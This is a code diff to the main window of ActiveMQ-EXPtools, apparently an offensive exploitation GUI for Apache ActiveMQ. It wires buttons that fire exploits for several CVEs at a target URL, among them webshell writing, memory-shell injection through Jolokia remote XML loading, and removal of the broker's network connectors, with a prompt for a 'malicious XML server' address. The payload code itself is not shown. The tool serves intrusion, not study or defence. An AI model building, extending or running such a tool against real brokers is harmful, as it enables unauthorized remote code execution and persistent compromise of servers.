@@ -18,14 +18,14 @@ public class MainFrame extends JFrame {
     private CVE20155254Panel cve20155254Panel;
     private CVE20163088Panel cve20163088Panel;
     private CVE202241678Panel cve202241678Panel;
-    private CVE202634197Panel cve202634197Panel;
+    private JolokiaLoadXmlPanel jolokiaLoadXmlPanel;
     private JTabbedPane mainTabbedPane;
     
     private EnvironmentService environmentService;
     private VulnerabilityService vulnerabilityService;
     
     public MainFrame() {
-        setTitle("ActiveMQ-EXPtools-1.1 - by kiiy(https://github.com/Catherines77/ActiveMQ-EXPtools)");
+        setTitle("ActiveMQ-EXPtools-1.3 - by kiiy(https://github.com/Catherines77/ActiveMQ-EXPtools)");
         setSize(1100, 700);
         setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
         setLocationRelativeTo(null);
@@ -52,13 +52,13 @@ public class MainFrame extends JFrame {
         cve20155254Panel = new CVE20155254Panel();
         cve20163088Panel = new CVE20163088Panel();
         cve202241678Panel = new CVE202241678Panel();
-        cve202634197Panel = new CVE202634197Panel();
+        jolokiaLoadXmlPanel = new JolokiaLoadXmlPanel();
         
         mainTabbedPane.addTab("目标环境", targetEnvPanel);
         mainTabbedPane.addTab("CVE-2015-5254", cve20155254Panel);
         mainTabbedPane.addTab("CVE-2016-3088", cve20163088Panel);
         mainTabbedPane.addTab("CVE-2022-41678", cve202241678Panel);
-        mainTabbedPane.addTab("CVE-2026-34197", cve202634197Panel);
+        mainTabbedPane.addTab("jolokia加载xml", jolokiaLoadXmlPanel);
         mainTabbedPane.addTab("BeanXML设置", beanXmlPanel);
         mainTabbedPane.addTab("程序设置", settingsPanel);
         
@@ -81,7 +81,9 @@ public class MainFrame extends JFrame {
         cve202241678Panel.addExecuteListener(e -> exploitCVE202241678());
         cve202241678Panel.addWriteWebshellListener(e -> writeWebshellCVE202241678());
         
-        cve202634197Panel.addInjectListener(e -> injectMemshellCVE202634197());
+        jolokiaLoadXmlPanel.addInjectCVE202634197Listener(e -> injectMemshellCVE202634197());
+        jolokiaLoadXmlPanel.addGetBrokerCVE202640466Listener(e -> getBrokerCVE202640466());
+        jolokiaLoadXmlPanel.addDiscoveryLoadXmlCVE202640466Listener(e -> discoveryLoadXmlCVE202640466());
     }
     
     private void detectEnvironment() {
@@ -291,18 +293,62 @@ public class MainFrame extends JFrame {
         String username = topPanel.getUsername();
         String password = topPanel.getPassword();
         String xmlServer = topPanel.getHttpServer();
-        String connectionInfo = cve202634197Panel.getCurrentConnectionInfo();
         
-        if (connectionInfo == null || connectionInfo.isEmpty()) {
-            JOptionPane.showMessageDialog(this, "请先生成 BeanXML 并复制到你的恶意服务器！");
+        jolokiaLoadXmlPanel.setCVE202634197ResultText("[*] 开始执行 CVE-2026-34197 远程加载 XML...\n");
+        new Thread(() -> {
+            String result = vulnerabilityService.exploitCVE202634197(url, username, password, xmlServer);
+            SwingUtilities.invokeLater(() -> {
+                jolokiaLoadXmlPanel.setCVE202634197ResultText("执行结果:\n" + result);
+            });
+        }).start();
+    }
+    
+    private void getBrokerCVE202640466() {
+        String url = topPanel.getTargetAddress();
+        if (url.isEmpty()) {
+            JOptionPane.showMessageDialog(this, "请输入目标地址！");
             return;
         }
         
-        cve202634197Panel.setResultText("[*] 开始执行 CVE-2026-34197 内存马注入...\n");
+        String username = topPanel.getUsername();
+        String password = topPanel.getPassword();
+        String xmlServer = topPanel.getHttpServer();
+        
+        if (xmlServer.isEmpty()) {
+            JOptionPane.showMessageDialog(this, "请输入恶意XML服务器地址！");
+            return;
+        }
+        
+        jolokiaLoadXmlPanel.setCVE202640466ResultText("[*] 开始获取 Broker 并尝试移除现有 NC...\n");
         new Thread(() -> {
-            String result = vulnerabilityService.exploitCVE202634197(url, username, password, xmlServer, connectionInfo);
+            String result = vulnerabilityService.getBrokerAndRemoveNC(url, username, password, xmlServer);
             SwingUtilities.invokeLater(() -> {
-                cve202634197Panel.setResultText("注入执行结果:\n" + result);
+                jolokiaLoadXmlPanel.setCVE202640466ResultText("执行结果:\n" + result);
+            });
+        }).start();
+    }
+
+    private void discoveryLoadXmlCVE202640466() {
+        String url = topPanel.getTargetAddress();
+        if (url.isEmpty()) {
+            JOptionPane.showMessageDialog(this, "请输入目标地址！");
+            return;
+        }
+        
+        String username = topPanel.getUsername();
+        String password = topPanel.getPassword();
+        String xmlServer = topPanel.getHttpServer();
+        
+        if (xmlServer.isEmpty()) {
+            JOptionPane.showMessageDialog(this, "请输入恶意XML服务器地址！");
+            return;
+        }
+        
+        jolokiaLoadXmlPanel.setCVE202640466ResultText("[*] 开始执行 discovery加载xml...\n");
+        new Thread(() -> {
+            String result = vulnerabilityService.discoveryLoadXmlCVE202640466(url, username, password, xmlServer);
+            SwingUtilities.invokeLater(() -> {
+                jolokiaLoadXmlPanel.setCVE202640466ResultText("执行结果:\n" + result);
             });
         }).start();
     }
